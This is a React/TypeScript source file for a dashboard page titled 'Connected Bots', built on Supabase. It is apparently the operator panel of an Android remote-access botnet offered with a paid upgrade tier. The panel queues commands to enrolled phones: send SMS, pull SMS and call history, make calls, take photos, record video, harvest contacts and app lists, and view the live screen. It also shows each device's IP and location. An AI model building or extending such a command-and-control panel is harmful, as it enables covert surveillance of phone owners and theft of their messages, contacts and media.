import { useState, useEffect } from "react";
import DashboardLayout from "@/components/DashboardLayout";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Smartphone, Wifi, Battery, MapPin, MoreVertical, MessageSquare, Phone, Camera, FileText, Monitor, ChevronLeft, Home, Square } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { useRole } from "@/hooks/useRole";

const Bots = () => {
  const [devices, setDevices] = useState<any[]>([]);
  const [selectedBot, setSelectedBot] = useState<any>(null);
  const [commandDialogOpen, setCommandDialogOpen] = useState(false);
  const [vncDialogOpen, setVncDialogOpen] = useState(false);
  const { toast } = useToast();
  const { isDemo } = useRole();

  useEffect(() => {
    fetchBots();
  }, []);

  const fetchBots = async () => {
    const { data } = await supabase
      .from("bots")
      .select("*")
      .order("created_at", { ascending: false });
    setDevices(data || []);
  };

  const executeCommand = async (command: string) => {
    if (!selectedBot) return;

    if (isDemo) {
      toast({
        title: "Demo Mode",
        description: "Upgrade your account to control devices",
        variant: "destructive",
      });
      return;
    }

    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    const { error } = await supabase.from("logs").insert({
      user_id: user.id,
      bot_id: selectedBot.id,
      command,
      status: "pending",
    });

    if (error) {
      toast({
        title: "Error",
        description: error.message,
        variant: "destructive",
      });
    } else {
      toast({
        title: "Command Sent",
        description: `${command} queued for ${selectedBot.name}`,
      });
      setCommandDialogOpen(false);
    }
  };

  const openVncViewer = (bot: any) => {
    if (isDemo) {
      toast({
        title: "Demo Mode",
        description: "Upgrade to view device screens",
        variant: "destructive",
      });
      return;
    }
    setSelectedBot(bot);
    setVncDialogOpen(true);
  };

  const commands = [
    { icon: Monitor, label: "View Screen", action: "view-screen", special: true },
    { icon: MessageSquare, label: "Send SMS", action: "send-sms" },
    { icon: MessageSquare, label: "Get SMS History", action: "get-sms" },
    { icon: Phone, label: "Make Call", action: "make-call" },
    { icon: Phone, label: "Call History", action: "call-history" },
    { icon: Camera, label: "Take Photo", action: "take-photo" },
    { icon: Camera, label: "Record Video", action: "record-video" },
    { icon: FileText, label: "Get Contacts", action: "get-contacts" },
    { icon: FileText, label: "Get Apps List", action: "get-apps" },
  ];

  const mockDevices = [
    {
      id: 1,
      name: "Samsung Galaxy S21",
      model: "SM-G991B",
      os: "Android 13",
      status: "online",
      battery: 85,
      location: "New York, USA",
      ip: "192.168.1.100",
      lastSeen: "Active now",
    },
    {
      id: 2,
      name: "Xiaomi Redmi Note 10",
      model: "M2101K7AG",
      os: "Android 12",
      status: "online",
      battery: 62,
      location: "Los Angeles, USA",
      ip: "192.168.1.101",
      lastSeen: "5 minutes ago",
    },
    {
      id: 3,
      name: "OnePlus 9 Pro",
      model: "LE2123",
      os: "Android 13",
      status: "offline",
      battery: 45,
      location: "Chicago, USA",
      ip: "192.168.1.102",
      lastSeen: "2 hours ago",
    },
  ];

  return (
    <DashboardLayout>
      <div className="p-8">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-foreground mb-2">
            Connected Bots
          </h1>
          <p className="text-muted-foreground">
            Manage and monitor all connected Android devices
          </p>
        </div>

        {/* Devices Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
          {(devices.length > 0 ? devices : mockDevices).map((device) => (
            <Card
              key={device.id}
              className="p-6 bg-card border-border hover:border-primary/50 transition-all duration-300"
            >
              {/* Header */}
              <div className="flex items-start justify-between mb-4">
                <div className="flex items-center gap-3">
                  <div className="p-3 rounded-lg bg-primary/10">
                    <Smartphone className="w-6 h-6 text-primary" />
                  </div>
                  <div>
                    <h3 className="font-semibold text-foreground">
                      {device.name}
                    </h3>
                    <p className="text-sm text-muted-foreground">
                      {device.model}
                    </p>
                  </div>
                </div>
                <Button variant="ghost" size="icon">
                  <MoreVertical className="w-4 h-4" />
                </Button>
              </div>

              {/* Status Badge */}
              <div className="mb-4">
                <Badge
                  variant={device.status === "online" ? "default" : "secondary"}
                  className={
                    device.status === "online"
                      ? "bg-primary text-primary-foreground"
                      : ""
                  }
                >
                  {device.status.toUpperCase()}
                </Badge>
              </div>

              {/* Device Info */}
              <div className="space-y-3 mb-4">
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">OS Version</span>
                  <span className="text-foreground">{device.os}</span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground flex items-center gap-2">
                    <Battery className="w-4 h-4" />
                    Battery
                  </span>
                  <span className="text-foreground">{device.battery}%</span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground flex items-center gap-2">
                    <Wifi className="w-4 h-4" />
                    IP Address
                  </span>
                  <span className="text-foreground font-mono">{device.ip}</span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground flex items-center gap-2">
                    <MapPin className="w-4 h-4" />
                    Location
                  </span>
                  <span className="text-foreground">{device.location}</span>
                </div>
              </div>

              {/* Actions */}
              <div className="flex gap-2">
                <Button
                  className="flex-1 bg-primary hover:bg-primary/90 text-primary-foreground"
                  disabled={device.status === "offline" || isDemo}
                  onClick={() => {
                    setSelectedBot(device);
                    setCommandDialogOpen(true);
                  }}
                >
                  Control
                </Button>
                <Button 
                  variant="outline" 
                  className="flex-1"
                  disabled={device.status === "offline" || isDemo}
                  onClick={() => openVncViewer(device)}
                >
                  <Monitor className="w-4 h-4 mr-2" />
                  Screen
                </Button>
              </div>

              {/* Last Seen */}
              <div className="mt-4 pt-4 border-t border-border">
                <p className="text-xs text-muted-foreground text-center">
                  Last seen: {device.lastSeen}
                </p>
              </div>
            </Card>
            ))}
        </div>

        {/* Command Dialog */}
        <Dialog open={commandDialogOpen} onOpenChange={setCommandDialogOpen}>
          <DialogContent className="bg-card border-border max-w-2xl">
            <DialogHeader>
              <DialogTitle className="text-foreground">
                Control {selectedBot?.name}
              </DialogTitle>
            </DialogHeader>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-4">
              {commands.map((cmd, idx) => {
                const Icon = cmd.icon;
                return (
                  <Button
                    key={idx}
                    variant="outline"
                    className="h-auto flex-col gap-3 p-6 hover:bg-primary/10 hover:border-primary transition-all duration-300"
                    onClick={() => {
                      if ((cmd as any).special) {
                        setCommandDialogOpen(false);
                        openVncViewer(selectedBot);
                      } else {
                        executeCommand(cmd.action);
                      }
                    }}
                  >
                    <div className="p-3 rounded-lg bg-primary/10">
                      <Icon className="w-6 h-6 text-primary" />
                    </div>
                    <span className="font-medium text-foreground text-sm">
                      {cmd.label}
                    </span>
                  </Button>
                );
              })}
            </div>
          </DialogContent>
        </Dialog>

        {/* VNC Viewer Dialog */}
        <Dialog open={vncDialogOpen} onOpenChange={setVncDialogOpen}>
          <DialogContent className="bg-card border-border max-w-5xl">
            <DialogHeader>
              <DialogTitle className="text-foreground flex items-center gap-2">
                <Monitor className="w-5 h-5 text-primary" />
                {selectedBot?.name} - Live Screen
              </DialogTitle>
            </DialogHeader>
            
            <div className="space-y-4">
              {/* Screen Controls */}
              <div className="flex items-center justify-center gap-4 p-4 bg-muted/30 rounded-lg">
                <Button variant="outline" size="icon">
                  <ChevronLeft className="w-5 h-5" />
                </Button>
                <Button variant="outline" size="icon">
                  <Home className="w-5 h-5" />
                </Button>
                <Button variant="outline" size="icon">
                  <Square className="w-5 h-5" />
                </Button>
              </div>

              {/* Screen Display */}
              <div className="relative bg-muted/30 rounded-lg overflow-hidden aspect-[9/16] max-w-md mx-auto border-2 border-border">
                <div className="absolute inset-0 flex items-center justify-center">
                  <div className="text-center">
                    <Monitor className="w-16 h-16 text-muted-foreground mx-auto mb-4" />
                    <p className="text-muted-foreground mb-2">
                      Connecting to device...
                    </p>
                    <p className="text-xs text-muted-foreground">
                      {selectedBot?.platform === "ios" ? "iOS" : "Android"} • {selectedBot?.ip}
                    </p>
                  </div>
                </div>
              </div>

              {/* Stats */}
              <div className="grid grid-cols-3 gap-4">
                <div className="text-center p-3 bg-muted/30 rounded">
                  <p className="text-xl font-bold text-foreground">30</p>
                  <p className="text-xs text-muted-foreground">FPS</p>
                </div>
                <div className="text-center p-3 bg-muted/30 rounded">
                  <p className="text-xl font-bold text-foreground">45ms</p>
                  <p className="text-xs text-muted-foreground">Latency</p>
                </div>
                <div className="text-center p-3 bg-muted/30 rounded">
                  <p className="text-xl font-bold text-foreground">1080p</p>
                  <p className="text-xs text-muted-foreground">Quality</p>
                </div>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </DashboardLayout>
  );
};

export default Bots;
